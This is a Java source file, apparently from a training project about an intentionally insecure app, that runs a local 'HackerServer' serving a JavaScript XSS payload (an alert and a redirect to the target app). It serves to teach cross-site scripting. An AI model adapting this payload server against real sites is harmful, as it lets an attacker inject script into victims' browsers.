        package com.globomantics.insecureapp.controller;

        import com.sun.net.httpserver.HttpExchange;
        import com.sun.net.httpserver.HttpHandler;
        
        import java.io.IOException;
        import java.io.OutputStream;
        import java.net.InetSocketAddress;
        import java.util.concurrent.Executors;
        import java.util.concurrent.ThreadPoolExecutor;
        
        public class HackerServer {

            private static final short TARGET_APP_PORT = 8001;
            private static final short HACKER_SERVER_PORT = 8002;

            public static void main(String[] args) throws IOException {
                System.out.println("Hacker server start in progress ...");
                com.sun.net.httpserver.HttpServer server = com.sun.net.httpserver.HttpServer.create(new InetSocketAddress("localhost", 8002), 0);
                ThreadPoolExecutor threadPoolExecutor = (ThreadPoolExecutor) Executors.newFixedThreadPool(10);
        
                server.createContext("/hacker", new HackerServer().new MyHttpHandler());
        
                server.setExecutor(threadPoolExecutor);
        
                server.start();
        
                System.out.println(" Server started on port " + HACKER_SERVER_PORT);
            }
        
            public class MyHttpHandler implements HttpHandler {
        
                @Override
                public void handle(HttpExchange exchange) throws IOException {
                    handleResponse(exchange, getDefaultPage());
                }
        
                private String getDefaultPage() {

                    return new StringBuilder()
                                    .append("alert('XSS Attack');window.location.href = \"http://localhost:"
                                    + TARGET_APP_PORT + "/insecureapp\";").toString();
                }
        
                private void handleResponse(HttpExchange exchange, String htmlResponse) throws IOException {
                    OutputStream outputStream = exchange.getResponseBody();
                    exchange.getResponseHeaders().add("Content-Type", "application/javascript");
                    exchange.sendResponseHeaders(200, htmlResponse.length());
                    outputStream.write(htmlResponse.getBytes());
                    outputStream.flush();
                    outputStream.close();
                }
            }
        }